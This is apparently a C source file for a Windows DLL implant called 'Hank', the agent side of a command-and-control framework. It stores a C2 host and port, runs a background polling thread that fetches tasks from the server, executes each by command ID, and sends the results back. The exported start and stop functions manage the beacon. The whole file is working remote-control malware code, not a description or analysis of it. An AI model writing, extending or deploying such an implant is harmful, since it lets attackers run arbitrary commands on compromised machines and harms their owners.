#define Hank_EXPORTS
#include "exports.h"

#define C2_HOST_BUFFER_LENGTH 64U
#define C2_PORT_BUFFER_LENGTH 16U
#define POLL_THREAD_WAIT_TIMEOUT_MS 5000U
#define POLL_LOOP_STOPPED 0L
#define POLL_LOOP_RUNNING 1L
#define TERMINATION_NOT_REQUESTED 0L
#define TERMINATION_REQUESTED 1L

static WCHAR G_C2Host[C2_HOST_BUFFER_LENGTH] = DEFAULT_C2_HOST;
static WCHAR G_C2Port[C2_PORT_BUFFER_LENGTH] = DEFAULT_C2_PORT;
static HANDLE G_PollThread = NULL;
static volatile LONG G_ShouldRun = POLL_LOOP_STOPPED;
static volatile LONG G_TerminationRequested = TERMINATION_NOT_REQUESTED;

/**
 * @brief Releases the global polling thread handle.
 *
 * If requested, this helper waits for the polling thread to exit before
 * closing the handle, unless it is running on that same thread. The handle
 * pointer is cleared atomically so only one caller performs the final close.
 *
 * @param waitForExit TRUE to wait for the thread to exit before closing.
 *
 * @return VOID
 */
static VOID ClosePollThreadHandle(BOOL waitForExit)
{
	HANDLE pollThread = (HANDLE)InterlockedExchangePointer(
		(PVOID volatile*)&G_PollThread,
		NULL
	);

	if (pollThread == NULL)
	{
		return;
	}

	if (waitForExit && GetCurrentThreadId() != GetThreadId(pollThread))
	{
		(void)WaitForSingleObject(pollThread, POLL_THREAD_WAIT_TIMEOUT_MS);
	}

	CloseHandle(pollThread);
}

/**
 * @brief Sends a task result back to the polling server.
 *
 * @param sock The active polling socket.
 * @param taskId The server-assigned task identifier.
 * @param commandId The executed command identifier.
 * @param commandStatus The numeric command result status.
 * @param resultData The optional command result bytes.
 * @param resultLength The number of result bytes.
 *
 * @return TRUE on success, or FALSE if the send fails.
 */
static BOOL SendTaskResult(
	SOCKET sock,
	DWORD taskId,
	DWORD commandId,
	DWORD commandStatus,
	CONST PBYTE resultData,
	DWORD resultLength
)
{
	TASK_RESULT_HEADER resultHeader = { 0 };
	PBYTE payload = NULL;
	DWORD payloadLength = sizeof(resultHeader) + resultLength;
	BOOL success = FALSE;

	resultHeader.agentId = DEFAULT_AGENT_ID;
	resultHeader.taskId = taskId;
	resultHeader.commandId = commandId;
	resultHeader.status = commandStatus;
	resultHeader.resultLength = resultLength;

	payload = (PBYTE)ImplantHeapAlloc(payloadLength);
	if (payload == NULL)
	{
		return FALSE;
	}

	CopyMemory(payload, &resultHeader, sizeof(resultHeader));
	if (resultLength > 0 && resultData != NULL)
	{
		CopyMemory(payload + sizeof(resultHeader), resultData, resultLength);
	}

	success = SendTlvMessage(sock, MSG_AGENT_POST_RESULT, payloadLength, payload);
	ImplantHeapFree(payload);

	return success;
}

/**
 * @brief Executes a single poll cycle against the task server.
 *
 * The agent requests one task, executes it if present, posts the result, and
 * then disconnects.
 *
 * @return VOID
 */
static VOID PollServerOnce(VOID)
{
	AGENT_GET_TASK_REQUEST getTaskRequest = { DEFAULT_AGENT_ID };
	TLV_MESSAGE responseMessage = { 0 };
	SOCKET sock = INVALID_SOCKET;
	PBYTE commandResult = NULL;
	DWORD commandResultLength = 0;
	DWORD commandStatus = NO_ERROR;

	if (!NetworkInit(G_C2Host, G_C2Port, &sock))
	{
		return;
	}

	if (!SendTlvMessage(
		sock,
		MSG_AGENT_GET_TASK,
		sizeof(getTaskRequest),
		(CONST PBYTE)&getTaskRequest
	))
	{
		goto cleanup;
	}

	if (!RecvMessage(sock, &responseMessage))
	{
		goto cleanup;
	}

	if (responseMessage.type == MSG_SERVER_NO_TASK)
	{
		goto cleanup;
	}

	if (responseMessage.type == MSG_SERVER_TASK)
	{
		TASK_HEADER* taskHeader = NULL;
		PBYTE taskArgs = NULL;

		if (responseMessage.length < sizeof(TASK_HEADER))
		{
			goto cleanup;
		}

		taskHeader = (TASK_HEADER*)responseMessage.value;
		taskArgs = responseMessage.value + sizeof(TASK_HEADER);

		commandStatus = ExecuteCommandById(
			taskHeader->commandId,
			taskHeader->argLength,
			taskArgs,
			&commandResult,
			&commandResultLength
		);

		FreeTlvMessage(&responseMessage);
		RtlSecureZeroMemory(&responseMessage, sizeof(responseMessage));

		if (!SendTaskResult(
			sock,
			taskHeader->taskId,
			taskHeader->commandId,
			commandStatus,
			commandResult,
			commandResultLength
		))
		{
			goto cleanup;
		}

		(void)RecvMessage(sock, &responseMessage);
	}

cleanup:
	if (commandResult != NULL)
	{
		ImplantHeapFree(commandResult);
	}

	FreeTlvMessage(&responseMessage);
	NetworkCleanup(sock);
}

/**
 * @brief Polling loop for the implant runtime.
 *
 * The thread performs one poll cycle, sleeps for the configured interval, and
 * then repeats until the implant is terminated.
 *
 * @param parameter Unused.
 *
 * @return 0 when the polling loop exits.
 */
static DWORD WINAPI PollThreadProc(LPVOID parameter)
{
	UNREFERENCED_PARAMETER(parameter);

	while (
		G_ShouldRun == POLL_LOOP_RUNNING &&
		!IsImplantTerminationRequested()
	)
	{
		PollServerOnce();

		if (!IsImplantTerminationRequested())
		{
			Sleep(DEFAULT_POLL_INTERVAL_MS);
		}
	}

	ClosePollThreadHandle(FALSE);
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
{
	UNREFERENCED_PARAMETER(instance);
	UNREFERENCED_PARAMETER(reason);
	UNREFERENCED_PARAMETER(reserved);

	return TRUE;
}

Hank_API BOOL HankInitialize(PCWSTR host, PCWSTR port)
{
	if (IsImplantTerminationRequested())
	{
		return FALSE;
	}

	if (host != NULL)
	{
		(void)wcsncpy_s(G_C2Host, ARRAYSIZE(G_C2Host), host, _TRUNCATE);
	}

	if (port != NULL)
	{
		(void)wcsncpy_s(G_C2Port, ARRAYSIZE(G_C2Port), port, _TRUNCATE);
	}

	if (!NetworkStartup())
	{
		return FALSE;
	}

	return TRUE;
}

Hank_API BOOL HankStart(VOID)
{
	HANDLE pollThread = NULL;

	if (IsImplantTerminationRequested())
	{
		return FALSE;
	}

	if (G_PollThread != NULL)
	{
		return TRUE;
	}

	InterlockedExchange(&G_ShouldRun, POLL_LOOP_RUNNING);
	pollThread = CreateThread(
		NULL,
		0,
		PollThreadProc,
		NULL,
		0,
		NULL
	);
	if (pollThread == NULL)
	{
		InterlockedExchange(&G_ShouldRun, POLL_LOOP_STOPPED);
		return FALSE;
	}

	G_PollThread = pollThread;
	return TRUE;
}

Hank_API VOID HankStop(VOID)
{
	RequestImplantTermination();
	ClosePollThreadHandle(TRUE);
	NetworkShutdown();

	CheckHeapBalance();
}

VOID RequestImplantTermination(VOID)
{
	InterlockedExchange(&G_TerminationRequested, TERMINATION_REQUESTED);
	InterlockedExchange(&G_ShouldRun, POLL_LOOP_STOPPED);
}

BOOL IsImplantTerminationRequested(VOID)
{
	return (G_TerminationRequested == TERMINATION_REQUESTED);
}
